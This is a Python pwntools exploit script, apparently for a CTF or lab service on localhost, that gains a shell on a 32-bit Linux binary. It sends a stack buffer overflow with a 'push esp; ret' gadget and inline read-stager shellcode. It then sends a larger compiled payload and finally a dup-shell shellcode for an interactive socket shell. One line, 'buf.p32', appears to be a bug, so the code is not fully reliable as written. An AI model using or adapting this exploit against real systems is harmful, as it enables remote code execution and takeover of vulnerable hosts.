from pwn import *
import cshc
import os
import time
context("i386", "linux")
os.environ["LC_MESSAGES"]="C"

m_sockfd = 4

r = remote("127.0.0.1", 10101)

print r.recv()

pushespret = 0x0804aacb

#esi = sock
buf = ""
buf += "A" * 115
buf.p32(pushespret)
#read stager
buf += flat(asm("""
_start:
        jmp caller
callee:
        pop ecx
        push 3
        pop eax
        cdq
        inc edx
        shl edx, 12
        push 4 ;sockfd
        pop ebx
        int 0x80
        jmp ecx
caller:
        call callee
        int3
"""))

if len(buf) <= 128:
    buf += "C" * (129 - len(buf))

assert not "\0" in buf
#raw_input(">")
r.sendline("search " + buf)

sc = cshc.arch("x86").compile_file("exploit2_heapspray.c")
assert len(sc) <= 4096
r.send(sc)
time.sleep(0.5)

sc2 = shellcode.dupsh(m_sockfd)
r.send(p32(len(sc2)))
r.send(sc2)
r.interactive()
